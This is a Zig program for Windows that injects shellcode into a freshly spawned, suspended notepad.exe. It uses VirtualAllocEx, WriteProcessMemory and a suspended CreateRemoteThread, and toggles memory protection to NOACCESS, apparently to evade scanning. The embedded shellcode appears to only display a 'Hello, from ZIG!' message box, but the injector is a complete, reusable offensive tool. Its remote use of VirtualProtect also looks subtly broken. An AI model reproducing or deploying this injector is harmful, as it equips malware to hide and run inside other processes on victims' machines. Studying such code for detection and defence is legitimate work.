// Import required modules
const std = @import("std");
const built = @import("builtin");
const native_arch = built.cpu.arch;
const win = std.os.windows;
const kernel32 = win.kernel32;

// Define types
const STARTUPINFOW = win.STARTUPINFOW;
const PROCESS_INFORMATION = win.PROCESS_INFORMATION;
const CREATE_SUSPENDED = 0x00000004;
const WINAPI = win.WINAPI;
const FALSE = win.FALSE;
const TRUE = win.TRUE;
const HANDLE = win.HANDLE;
const DWORD = win.DWORD;
const BOOL = win.BOOL;
const SIZE_T = win.SIZE_T;
const LPVOID = win.LPVOID;
const LPCVOID = win.LPCVOID;
const LPSECURITY_ATTRIBUTES = *win.SECURITY_ATTRIBUTES;
const LPDWORD = *DWORD;
const LPTHREAD_START_ROUTINE = win.LPTHREAD_START_ROUTINE;
const PROCESS_ALL_ACCESS = 0x000F0000 | (0x00100000) | 0xFFFF;

// Global structures
var si: STARTUPINFOW = undefined;
var pi: PROCESS_INFORMATION = undefined;

// External function declarations
extern "kernel32" fn OpenProcess(dwDesiredAccess: DWORD, bInheritHandle: BOOL, dwProcessId: DWORD) callconv(WINAPI) HANDLE;
extern "kernel32" fn VirtualAllocEx(hProcess: HANDLE, lpAddress: ?LPVOID, dwSize: SIZE_T, flAllocationType: DWORD, flProtect: DWORD) callconv(WINAPI) LPVOID;
extern "kernel32" fn WriteProcessMemory(hProcess: HANDLE, lpBaseAddress: LPVOID, lpBuffer: LPCVOID, nSize: SIZE_T, lpNumberOfBytesWritten: *SIZE_T) callconv(WINAPI) BOOL;
extern "kernel32" fn CreateRemoteThread(hProcess: HANDLE, lpThreadAttributes: ?LPSECURITY_ATTRIBUTES, dwStackSize: SIZE_T, lpStartAddress: LPTHREAD_START_ROUTINE, lpParameter: ?LPVOID, dwCreationFlags: DWORD, lpThreadId: ?LPDWORD) callconv(WINAPI) HANDLE;
extern "kernel32" fn VirtualProtect(lpAddress: LPVOID, dwSize: SIZE_T, flNewProtect: DWORD, lpflOldProtect: *DWORD) callconv(WINAPI) BOOL;
extern "kernel32" fn ResumeThread(hThread: HANDLE) callconv(WINAPI) DWORD;

pub fn main() void {
    // Display a message indicating x64 process execution
    std.io.getStdOut().writer().print("[*] Running in x64 process\n", .{}) catch undefined;

    // Define the shellcode
    const shellcodeX64 = [_]u8{ 0xfc, 0x48, 0x81, 0xe4, 0xf0, 0xff, 0xff, 0xff, 0xe8, 0xd0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x3e, 0x48, 0x8b, 0x52, 0x18, 0x3e, 0x48, 0x8b, 0x52, 0x20, 0x3e, 0x48, 0x8b, 0x72, 0x50, 0x3e, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x3e, 0x48, 0x8b, 0x52, 0x20, 0x3e, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x3e, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x6f, 0x48, 0x01, 0xd0, 0x50, 0x3e, 0x8b, 0x48, 0x18, 0x3e, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x5c, 0x48, 0xff, 0xc9, 0x3e, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x3e, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd6, 0x58, 0x3e, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x3e, 0x41, 0x8b, 0x0c, 0x48, 0x3e, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x3e, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x3e, 0x48, 0x8b, 0x12, 0xe9, 0x49, 0xff, 0xff, 0xff, 0x5d, 0x49, 0xc7, 0xc1, 0x00, 0x00, 0x00, 0x00, 0x3e, 0x48, 0x8d, 0x95, 0xfe, 0x00, 0x00, 0x00, 0x3e, 0x4c, 0x8d, 0x85, 0x0f, 0x01, 0x00, 0x00, 0x48, 0x31, 0xc9, 0x41, 0xba, 0x45, 0x83, 0x56, 0x07, 0xff, 0xd5, 0x48, 0x31, 0xc9, 0x41, 0xba, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5, 0x48, 0x65, 0x6c, 0x6c, 0x6f, 0x2c, 0x20, 0x66, 0x72, 0x6f, 0x6d, 0x20, 0x5A, 0x49, 0x47, 0x21, 0x00, 0x4d, 0x65, 0x73, 0x73, 0x61, 0x67, 0x65, 0x42, 0x6f, 0x78, 0x00 };

    // Perform an action based on the native architecture
    switch (native_arch) {
        .x86 => {},
        .x86_64 => {},
        else => {},
    }

    // Inject shellcode using CreateRemoteThread
    suspendedThreadInjection(u8, shellcodeX64[0..]);
}

// Function to inject shellcode using CreateRemoteThread
fn suspendedThreadInjection(comptime T: type, shellcode: []const T) void {
    const stdOut = std.io.getStdOut().writer();

    var op: DWORD = undefined;

    // Allocate space for the application name in UTF-16
    var allocator = std.heap.page_allocator;
    const appName: []const u8 = "notepad.exe";
    var appNameUnicode = std.unicode.utf8ToUtf16LeWithNull(allocator, appName) catch undefined;

    // Create the process in suspended state
    _ = kernel32.CreateProcessW(null, appNameUnicode, null, null, FALSE, CREATE_SUSPENDED, null, null, &si, &pi);
    defer _ = kernel32.CloseHandle(pi.hProcess);
    defer _ = kernel32.CloseHandle(pi.hThread);
    stdOut.print("[*] Target Process: {any}\n", .{pi.dwProcessId}) catch undefined;

    // Open the process with PROCESS_ALL_ACCESS
    const pHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pi.dwProcessId);
    defer _ = kernel32.CloseHandle(pHandle);
    stdOut.print("[*] pHandle: {any}\n", .{@intFromPtr(pHandle)}) catch undefined;

    // Allocate memory in the remote process and write shellcode
    const rPtr = VirtualAllocEx(pHandle, null, shellcode.len, win.MEM_COMMIT, win.PAGE_EXECUTE_READWRITE);

    // Copy the shellcode into the remote process's memory using WriteProcessMemory,
    // and store the number of bytes written in the 'bytesWritten' variable.
    var bytesWritten: SIZE_T = undefined;
    const wSuccess = WriteProcessMemory(pHandle, rPtr, @ptrCast(shellcode.ptr), shellcode.len, &bytesWritten);
    stdOut.print("[*] WriteProcessMemory: {any}\n", .{wSuccess}) catch undefined;
    stdOut.print("    \\-- bytes written: {any}\n", .{bytesWritten}) catch undefined;

    // Change the memory protection of the shellcode region to PAGE_NOACCESS.
    // This effectively marks the memory as inaccessible, preventing execution.
    _ = VirtualProtect(@ptrCast(rPtr), shellcode.len, win.PAGE_NOACCESS, &op);

    // Create a remote thread in the target process to execute the shellcode.
    // The thread is created in a suspended state using the CREATE_SUSPENDED flag.
    const tHandle = CreateRemoteThread(pHandle, null, 0, @ptrCast(rPtr), null, CREATE_SUSPENDED, null);
    defer _ = kernel32.CloseHandle(tHandle);

    // Change the memory protection of the shellcode region to PAGE_EXECUTE_READWRITE.
    // This allows the memory to be both readable and writable, as well as executable.
    _ = VirtualProtect(@ptrCast(rPtr), shellcode.len, win.PAGE_EXECUTE_READWRITE, &op);

    // Resume the suspended thread, allowing shellcode execution
    _ = ResumeThread(tHandle);

    stdOut.print("[*] tHandle: {any}\n", .{@intFromPtr(tHandle)}) catch undefined;
    stdOut.print("[+] Injected\n", .{}) catch undefined;
}
